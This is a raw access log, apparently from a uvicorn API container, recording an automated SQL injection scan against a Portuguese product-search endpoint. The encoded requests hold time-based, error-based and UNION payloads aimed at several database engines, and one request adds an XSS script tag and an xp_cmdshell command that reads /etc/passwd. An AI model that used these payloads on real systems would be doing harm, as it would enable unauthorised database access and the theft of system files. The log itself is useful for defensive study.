api-1  | INFO:     Started server process [1]
api-1  | INFO:     172.18.0.1:50532 - "GET /produtos/busca/?nome=teste%27%29%3BSELECT%2F%2A%2A%2FDBMS_PIPE.RECEIVE_MESSAGE%28CHR%28103%29%7C%7CCHR%28108%29%7C%7CCHR%2884%29%7C%7CCHR%28122%29%2C5%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL-- HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:50536 - "GET /produtos/busca/?nome=teste%27%3BSELECT%2F%2A%2A%2FDBMS_PIPE.RECEIVE_MESSAGE%28CHR%28103%29%7C%7CCHR%28108%29%7C%7CCHR%2884%29%7C%7CCHR%28122%29%2C5%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL-- HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:50544 - "GET /produtos/busca/?nome=teste%29%3BSELECT%2F%2A%2A%2FDBMS_PIPE.RECEIVE_MESSAGE%28CHR%28103%29%7C%7CCHR%28108%29%7C%7CCHR%2884%29%7C%7CCHR%28122%29%2C5%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL-- HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:50546 - "GET /produtos/busca/?nome=teste%3BSELECT%2F%2A%2A%2FDBMS_PIPE.RECEIVE_MESSAGE%28CHR%28103%29%7C%7CCHR%28108%29%7C%7CCHR%2884%29%7C%7CCHR%28122%29%2C5%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL-- HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:50552 - "GET /produtos/busca/?nome=teste%27%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F5119%2F%2A%2A%2FFROM%2F%2A%2A%2F%28SELECT%28SLEEP%285%29%29%29ZnNU%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27yFKa%27%3D%27yFKa HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:50556 - "GET /produtos/busca/?nome=teste%27%2F%2A%2A%2FAND%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F5119%2F%2A%2A%2FFROM%2F%2A%2A%2F%28SELECT%28SLEEP%285%29%29%29ZnNU%29%2F%2A%2A%2FAND%2F%2A%2A%2F%27iIyK%27%3D%27iIyK HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:50564 - "GET /produtos/busca/?nome=teste%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F5119%2F%2A%2A%2FFROM%2F%2A%2A%2F%28SELECT%28SLEEP%285%29%29%29ZnNU%29%2F%2A%2A%2FAND%2F%2A%2A%2F%282844%3D2844 HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:50578 - "GET /produtos/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F5119%2F%2A%2A%2FFROM%2F%2A%2A%2F%28SELECT%28SLEEP%285%29%29%29ZnNU%29 HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:50586 - "GET /produtos/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F5119%2F%2A%2A%2FFROM%2F%2A%2A%2F%28SELECT%28SLEEP%285%29%29%29ZnNU%29--%2F%2A%2A%2FRbID HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:50590 - "GET /produtos/busca/?nome=teste%27%29%2F%2A%2A%2FAND%2F%2A%2A%2F2973%3D%28SELECT%2F%2A%2A%2F2973%2F%2A%2A%2FFROM%2F%2A%2A%2FPG_SLEEP%285%29%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27XDGM%27%3D%27XDGM HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:50594 - "GET /produtos/busca/?nome=teste%27%2F%2A%2A%2FAND%2F%2A%2A%2F2973%3D%28SELECT%2F%2A%2A%2F2973%2F%2A%2A%2FFROM%2F%2A%2A%2FPG_SLEEP%285%29%29%2F%2A%2A%2FAND%2F%2A%2A%2F%27JJqj%27%3D%27JJqj HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:50602 - "GET /produtos/busca/?nome=teste%29%2F%2A%2A%2FAND%2F%2A%2A%2F2973%3D%28SELECT%2F%2A%2A%2F2973%2F%2A%2A%2FFROM%2F%2A%2A%2FPG_SLEEP%285%29%29%2F%2A%2A%2FAND%2F%2A%2A%2F%284475%3D4475 HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:50598 - "GET /produtos/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2F2973%3D%28SELECT%2F%2A%2A%2F2973%2F%2A%2A%2FFROM%2F%2A%2A%2FPG_SLEEP%285%29%29 HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:50610 - "GET /produtos/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2F2973%3D%28SELECT%2F%2A%2A%2F2973%2F%2A%2A%2FFROM%2F%2A%2A%2FPG_SLEEP%285%29%29--%2F%2A%2A%2FtIEE HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:50616 - "GET /produtos/busca/?nome=teste%27%29%2F%2A%2A%2FWAITFOR%2F%2A%2A%2FDELAY%2F%2A%2A%2F%270%3A0%3A5%27%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27LZdp%27%3D%27LZdp HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:50628 - "GET /produtos/busca/?nome=teste%27%2F%2A%2A%2FWAITFOR%2F%2A%2A%2FDELAY%2F%2A%2A%2F%270%3A0%3A5%27%2F%2A%2A%2FAND%2F%2A%2A%2F%27PQrt%27%3D%27PQrt HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:50644 - "GET /produtos/busca/?nome=teste%29%2F%2A%2A%2FWAITFOR%2F%2A%2A%2FDELAY%2F%2A%2A%2F%270%3A0%3A5%27%2F%2A%2A%2FAND%2F%2A%2A%2F%286157%3D6157 HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:50648 - "GET /produtos/busca/?nome=teste%2F%2A%2A%2FWAITFOR%2F%2A%2A%2FDELAY%2F%2A%2A%2F%270%3A0%3A5%27 HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:50666 - "GET /produtos/busca/?nome=teste%2F%2A%2A%2FWAITFOR%2F%2A%2A%2FDELAY%2F%2A%2A%2F%270%3A0%3A5%27--%2F%2A%2A%2FBxBy HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:50674 - "GET /produtos/busca/?nome=teste%27%29%2F%2A%2A%2FAND%2F%2A%2A%2F6749%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2877%29%7C%7CCHR%28102%29%7C%7CCHR%28107%29%7C%7CCHR%28116%29%2C5%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27Vurp%27%3D%27Vurp HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:50650 - "GET /produtos/busca/?nome=teste%27%2F%2A%2A%2FAND%2F%2A%2A%2F6749%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2877%29%7C%7CCHR%28102%29%7C%7CCHR%28107%29%7C%7CCHR%28116%29%2C5%29%2F%2A%2A%2FAND%2F%2A%2A%2F%27ZZjT%27%3D%27ZZjT HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:50678 - "GET /produtos/busca/?nome=teste%29%2F%2A%2A%2FAND%2F%2A%2A%2F6749%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2877%29%7C%7CCHR%28102%29%7C%7CCHR%28107%29%7C%7CCHR%28116%29%2C5%29%2F%2A%2A%2FAND%2F%2A%2A%2F%289778%3D9778 HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:50690 - "GET /produtos/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2F6749%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2877%29%7C%7CCHR%28102%29%7C%7CCHR%28107%29%7C%7CCHR%28116%29%2C5%29 HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:50692 - "GET /produtos/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2F6749%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2877%29%7C%7CCHR%28102%29%7C%7CCHR%28107%29%7C%7CCHR%28116%29%2C5%29--%2F%2A%2A%2FzpzE HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:50706 - "GET /produtos/busca/?nome=teste%27%29%2F%2A%2A%2FORDER%2F%2A%2A%2FBY%2F%2A%2A%2F1--%2F%2A%2A%2FabAE HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:50710 - "GET /produtos/busca/?nome=teste%27%29%2F%2A%2A%2FORDER%2F%2A%2A%2FBY%2F%2A%2A%2F6704--%2F%2A%2A%2FpjFw HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:50718 - "GET /produtos/busca/?nome=teste%27%2F%2A%2A%2FORDER%2F%2A%2A%2FBY%2F%2A%2A%2F1--%2F%2A%2A%2FTTbY HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:50722 - "GET /produtos/busca/?nome=teste%27%2F%2A%2A%2FORDER%2F%2A%2A%2FBY%2F%2A%2A%2F8959--%2F%2A%2A%2FhofE HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:50724 - "GET /produtos/busca/?nome=teste%29%2F%2A%2A%2FORDER%2F%2A%2A%2FBY%2F%2A%2A%2F1--%2F%2A%2A%2FCiRw HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:50716 - "GET /produtos/busca/?nome=teste%29%2F%2A%2A%2FORDER%2F%2A%2A%2FBY%2F%2A%2A%2F7753--%2F%2A%2A%2FTuFc HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:50730 - "GET /produtos/busca/?nome=teste%2F%2A%2A%2FORDER%2F%2A%2A%2FBY%2F%2A%2A%2F1--%2F%2A%2A%2FFEeh HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:50736 - "GET /produtos/busca/?nome=teste%2F%2A%2A%2FORDER%2F%2A%2A%2FBY%2F%2A%2A%2F9748--%2F%2A%2A%2FNcmF HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:50750 - "GET /produtos/busca/?nome=teste%2F%2A%2A%2FORDER%2F%2A%2A%2FBY%2F%2A%2A%2F1--%2F%2A%2A%2FXyYa HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:50760 - "GET /produtos/busca/?nome=teste%2F%2A%2A%2FORDER%2F%2A%2A%2FBY%2F%2A%2A%2F9785--%2F%2A%2A%2FeEag HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:50786 - "GET /produtos/busca/?categoria=teste HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:50792 - "GET /produtos/busca/?categoria=teste&iyvH=3114%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23 HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:50796 - "GET /produtos/busca/?categoria=teste HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:50802 - "GET /produtos/busca/?categoria=1340 HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:50818 - "GET /produtos/busca/?categoria=teste%28%29%22%29%29%27%2C%28%28%28 HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:50824 - "GET /produtos/busca/?categoria=teste%27rTUNlD%3C%27%22%3EbbrceL HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:50832 - "GET /produtos/busca/?categoria=teste HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:50838 - "GET /produtos/busca/?categoria=teste%27%29%2F%2A%2A%2FAND%2F%2A%2A%2F7511%3D1115%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27xrKl%27%3D%27xrKl HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:50854 - "GET /produtos/busca/?categoria=teste%27%2F%2A%2A%2FAND%2F%2A%2A%2F9417%3D7454%2F%2A%2A%2FAND%2F%2A%2A%2F%27iBXr%27%3D%27iBXr HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:50870 - "GET /produtos/busca/?categoria=teste%29%2F%2A%2A%2FAND%2F%2A%2A%2F1610%3D3128%2F%2A%2A%2FAND%2F%2A%2A%2F%286318%3D6318 HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:50882 - "GET /produtos/busca/?categoria=teste%2F%2A%2A%2FAND%2F%2A%2A%2F1749%3D8755 HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:50884 - "GET /produtos/busca/?categoria=teste%2F%2A%2A%2FAND%2F%2A%2A%2F1691%3D5130--%2F%2A%2A%2FeoXM HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:50898 - "GET /produtos/busca/?categoria=%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%282634%3D3427%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F%27teste%27%2F%2A%2A%2FELSE%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F3427%2F%2A%2A%2FUNION%2F%2A%2A%2FSELECT%2F%2A%2A%2F1048%29%2F%2A%2A%2FEND%29%29 HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:50914 - "GET /produtos/busca/?categoria=teste%27%29%2F%2A%2A%2FAND%2F%2A%2A%2FEXTRACTVALUE%286522%2CCONCAT%280x5c%2C0x716a6a7871%2C%28SELECT%2F%2A%2A%2F%28ELT%286522%3D6522%2C1%29%29%29%2C0x7176707071%29%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27OrjD%27%3D%27OrjD HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:50922 - "GET /produtos/busca/?categoria=teste%27%2F%2A%2A%2FAND%2F%2A%2A%2FEXTRACTVALUE%286522%2CCONCAT%280x5c%2C0x716a6a7871%2C%28SELECT%2F%2A%2A%2F%28ELT%286522%3D6522%2C1%29%29%29%2C0x7176707071%29%29%2F%2A%2A%2FAND%2F%2A%2A%2F%27BkUY%27%3D%27BkUY HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:50954 - "GET /produtos/busca/?categoria=teste%29%2F%2A%2A%2FAND%2F%2A%2A%2FEXTRACTVALUE%286522%2CCONCAT%280x5c%2C0x716a6a7871%2C%28SELECT%2F%2A%2A%2F%28ELT%286522%3D6522%2C1%29%29%29%2C0x7176707071%29%29%2F%2A%2A%2FAND%2F%2A%2A%2F%287322%3D7322 HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:50938 - "GET /produtos/busca/?categoria=teste%2F%2A%2A%2FAND%2F%2A%2A%2FEXTRACTVALUE%286522%2CCONCAT%280x5c%2C0x716a6a7871%2C%28SELECT%2F%2A%2A%2F%28ELT%286522%3D6522%2C1%29%29%29%2C0x7176707071%29%29 HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:50962 - "GET /produtos/busca/?categoria=teste%2F%2A%2A%2FAND%2F%2A%2A%2FEXTRACTVALUE%286522%2CCONCAT%280x5c%2C0x716a6a7871%2C%28SELECT%2F%2A%2A%2F%28ELT%286522%3D6522%2C1%29%29%29%2C0x7176707071%29%29--%2F%2A%2A%2FCwim HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:50964 - "GET /produtos/busca/?categoria=teste%27%29%2F%2A%2A%2FAND%2F%2A%2A%2F4573%3DCAST%28%28CHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28106%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%284573%3D4573%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28112%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%29%2F%2A%2A%2FAS%2F%2A%2A%2FNUMERIC%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27QVtG%27%3D%27QVtG HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:50980 - "GET /produtos/busca/?categoria=teste%27%2F%2A%2A%2FAND%2F%2A%2A%2F4573%3DCAST%28%28CHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28106%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%284573%3D4573%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28112%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%29%2F%2A%2A%2FAS%2F%2A%2A%2FNUMERIC%29%2F%2A%2A%2FAND%2F%2A%2A%2F%27kFpT%27%3D%27kFpT HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:50984 - "GET /produtos/busca/?categoria=teste%29%2F%2A%2A%2FAND%2F%2A%2A%2F4573%3DCAST%28%28CHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28106%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%284573%3D4573%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28112%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%29%2F%2A%2A%2FAS%2F%2A%2A%2FNUMERIC%29%2F%2A%2A%2FAND%2F%2A%2A%2F%281045%3D1045 HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:50994 - "GET /produtos/busca/?categoria=teste%2F%2A%2A%2FAND%2F%2A%2A%2F4573%3DCAST%28%28CHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28106%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%284573%3D4573%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28112%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%29%2F%2A%2A%2FAS%2F%2A%2A%2FNUMERIC%29 HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:51010 - "GET /produtos/busca/?categoria=teste%2F%2A%2A%2FAND%2F%2A%2A%2F4573%3DCAST%28%28CHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28106%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%284573%3D4573%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28112%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%29%2F%2A%2A%2FAS%2F%2A%2A%2FNUMERIC%29--%2F%2A%2A%2FYbEl HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:51022 - "GET /produtos/busca/?categoria=teste%27%29%2F%2A%2A%2FAND%2F%2A%2A%2F7519%2F%2A%2A%2FIN%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F%28CHAR%28113%29%2BCHAR%28106%29%2BCHAR%28106%29%2BCHAR%28120%29%2BCHAR%28113%29%2B%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%287519%3D7519%29%2F%2A%2A%2FTHEN%2F%2A%2A%2FCHAR%2849%29%2F%2A%2A%2FELSE%2F%2A%2A%2FCHAR%2848%29%2F%2A%2A%2FEND%29%29%2BCHAR%28113%29%2BCHAR%28118%29%2BCHAR%28112%29%2BCHAR%28112%29%2BCHAR%28113%29%29%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27PPrh%27%3D%27PPrh HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:51028 - "GET /produtos/busca/?categoria=teste%27%2F%2A%2A%2FAND%2F%2A%2A%2F7519%2F%2A%2A%2FIN%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F%28CHAR%28113%29%2BCHAR%28106%29%2BCHAR%28106%29%2BCHAR%28120%29%2BCHAR%28113%29%2B%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%287519%3D7519%29%2F%2A%2A%2FTHEN%2F%2A%2A%2FCHAR%2849%29%2F%2A%2A%2FELSE%2F%2A%2A%2FCHAR%2848%29%2F%2A%2A%2FEND%29%29%2BCHAR%28113%29%2BCHAR%28118%29%2BCHAR%28112%29%2BCHAR%28112%29%2BCHAR%28113%29%29%29%2F%2A%2A%2FAND%2F%2A%2A%2F%27ehua%27%3D%27ehua HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:51036 - "GET /produtos/busca/?categoria=teste%29%2F%2A%2A%2FAND%2F%2A%2A%2F7519%2F%2A%2A%2FIN%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F%28CHAR%28113%29%2BCHAR%28106%29%2BCHAR%28106%29%2BCHAR%28120%29%2BCHAR%28113%29%2B%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%287519%3D7519%29%2F%2A%2A%2FTHEN%2F%2A%2A%2FCHAR%2849%29%2F%2A%2A%2FELSE%2F%2A%2A%2FCHAR%2848%29%2F%2A%2A%2FEND%29%29%2BCHAR%28113%29%2BCHAR%28118%29%2BCHAR%28112%29%2BCHAR%28112%29%2BCHAR%28113%29%29%29%2F%2A%2A%2FAND%2F%2A%2A%2F%284437%3D4437 HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:51000 - "GET /produtos/busca/?categoria=teste%2F%2A%2A%2FAND%2F%2A%2A%2F7519%2F%2A%2A%2FIN%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F%28CHAR%28113%29%2BCHAR%28106%29%2BCHAR%28106%29%2BCHAR%28120%29%2BCHAR%28113%29%2B%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%287519%3D7519%29%2F%2A%2A%2FTHEN%2F%2A%2A%2FCHAR%2849%29%2F%2A%2A%2FELSE%2F%2A%2A%2FCHAR%2848%29%2F%2A%2A%2FEND%29%29%2BCHAR%28113%29%2BCHAR%28118%29%2BCHAR%28112%29%2BCHAR%28112%29%2BCHAR%28113%29%29%29 HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:51044 - "GET /produtos/busca/?categoria=teste%2F%2A%2A%2FAND%2F%2A%2A%2F7519%2F%2A%2A%2FIN%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F%28CHAR%28113%29%2BCHAR%28106%29%2BCHAR%28106%29%2BCHAR%28120%29%2BCHAR%28113%29%2B%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%287519%3D7519%29%2F%2A%2A%2FTHEN%2F%2A%2A%2FCHAR%2849%29%2F%2A%2A%2FELSE%2F%2A%2A%2FCHAR%2848%29%2F%2A%2A%2FEND%29%29%2BCHAR%28113%29%2BCHAR%28118%29%2BCHAR%28112%29%2BCHAR%28112%29%2BCHAR%28113%29%29%29--%2F%2A%2A%2FnlFZ HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:51048 - "GET /produtos/busca/?categoria=teste%27%29%2F%2A%2A%2FAND%2F%2A%2A%2F9594%3D%28SELECT%2F%2A%2A%2FUPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28106%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%289594%3D9594%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28112%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27eJex%27%3D%27eJex HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:51060 - "GET /produtos/busca/?categoria=teste%27%2F%2A%2A%2FAND%2F%2A%2A%2F9594%3D%28SELECT%2F%2A%2A%2FUPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28106%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%289594%3D9594%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28112%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29%2F%2A%2A%2FAND%2F%2A%2A%2F%27fUjW%27%3D%27fUjW HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:51072 - "GET /produtos/busca/?categoria=teste%29%2F%2A%2A%2FAND%2F%2A%2A%2F9594%3D%28SELECT%2F%2A%2A%2FUPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28106%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%289594%3D9594%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28112%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29%2F%2A%2A%2FAND%2F%2A%2A%2F%287264%3D7264 HTTP/1.1" 200 OK
